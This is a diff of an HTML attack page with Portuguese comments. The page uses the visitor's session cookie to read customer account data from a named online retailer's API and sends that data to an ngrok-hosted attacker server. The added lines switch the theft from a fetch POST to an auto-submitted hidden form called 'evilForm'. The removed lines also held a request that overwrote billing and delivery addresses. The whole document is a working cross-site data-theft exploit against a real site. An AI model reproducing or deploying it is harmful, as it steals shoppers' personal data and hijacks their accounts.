@@ -1,9 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <form id="evilForm" method="POST" action="https://7766-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/">
+        <input type="hidden" name="data">
+    </form>
     <script>
-        fetch("https://www.boozt.com/at/de-at/api/customer?data=%7B%22requisites%22%3A%7B%22billing_firstname%22%3A%22Hacked%22%2C%22billing_lastname%22%3A%22ByMe%22%2C%22billing_street%22%3A%22EvilStreet%22%2C%22billing_postcode%22%3A%22666%22%2C%22billing_city%22%3A%22Hell%22%2C%22billing_country%22%3A%22pt%22%2C%22delivery_firstname%22%3A%22Hacked%22%2C%22delivery_lastname%22%3A%22ByMe%22%2C%22delivery_street%22%3A%22EvilStreet%22%2C%22delivery_postcode%22%3A%22666%22%2C%22delivery_city%22%3A%22Hell%22%2C%22delivery_country%22%3A%22pt%22%2C%22delivery_as_billing%22%3Atrue%7D%7D&Csrf-Token=f7b24e74899ced25052be23894053aab", {
-            method: "GET", // Usamos GET porque o <form> anterior funcionou assim
+        fetch("https://www.boozt.com/at/de-at/api/customer", {
+            method: "GET",
             credentials: "include" // Envia o PHPSESSID
         })
         .then(response => {
@@ -11,20 +14,14 @@
             return response.json();
         })
         .then(data => {
-            // Enviar os dados para o servidor Go
-            fetch("https://7766-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/", { // Substitua pelo seu URL do Ngrok
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
+            // Preencher o campo hidden e submeter o formulário
+            document.querySelector("input[name=data]").value = JSON.stringify(data);
+            document.getElementById("evilForm").submit();
         })
         .catch(error => {
-            console.error("Erro:", error);
             // Logar o erro no servidor Go
-            fetch("https://7766-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/", {
-                method: "POST",
-                body: JSON.stringify({ error: error.message })
-            });
+            document.querySelector("input[name=data]").value = JSON.stringify({ error: error.message });
+            document.getElementById("evilForm").submit();
         });
     </script>
 </body>
